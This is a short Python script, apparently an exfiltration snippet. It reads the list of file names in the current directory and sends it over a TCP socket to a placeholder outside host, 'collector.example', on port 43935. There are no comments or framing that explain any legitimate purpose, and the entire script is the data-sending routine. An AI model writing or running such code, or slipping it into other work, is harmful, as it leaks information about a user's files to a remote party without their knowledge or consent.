import os
import socket

host = "collector.example"
port = 43935
files = os.listdir(".")
listing = "\n".join(files)
message = f"Files in directory:\n{listing}"

with socket.create_connection((host, port), timeout=10) as sock:
    sock.sendall(message.encode("utf-8"))
